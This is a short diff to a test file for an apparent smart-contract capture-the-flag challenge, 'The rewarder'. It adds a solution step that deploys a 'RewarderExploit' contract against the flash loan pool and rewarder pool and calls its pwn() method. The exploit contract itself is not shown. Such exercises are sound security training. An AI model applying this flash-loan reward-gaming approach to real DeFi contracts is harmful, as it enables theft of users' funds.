@@ -96,6 +96,17 @@ describe("[Challenge] The rewarder", function () {
 
   it("Execution", async function () {
     /** CODE YOUR SOLUTION HERE */
+    const ExploitFactory = await ethers.getContractFactory(
+      "RewarderExploit",
+      player
+    );
+    const exploit = await ExploitFactory.deploy(
+      TOKENS_IN_LENDER_POOL,
+      flashLoanPool.address,
+      rewarderPool.address
+    );
+
+    await exploit.pwn();
   });
 
   after(async function () {
